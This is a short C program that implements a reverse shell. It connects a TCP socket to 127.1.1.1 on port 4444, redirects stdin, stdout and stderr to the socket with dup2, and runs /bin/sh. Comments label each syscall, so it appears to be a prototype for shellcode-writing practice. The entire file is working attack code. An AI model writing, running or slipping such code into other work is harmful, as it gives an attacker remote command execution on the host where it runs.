#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#define REMOTE_ADDR "127.1.1.1"
#define REMOTE_PORT 4444

int main(int argc, char *argv[])
{
    struct sockaddr_in sa;
    int s;
    s = socket(AF_INET, SOCK_STREAM, 0);
    //creating our struct
    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
    sa.sin_port = htons(REMOTE_PORT);
    //first syscall socket
    //second syscall connect
    connect(s, (struct sockaddr *)&sa, sizeof(sa));
    //third syscall dup2
    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);
    
    //final syscall execve
    execve("/bin/sh", 0, 0);
    return 0;
}
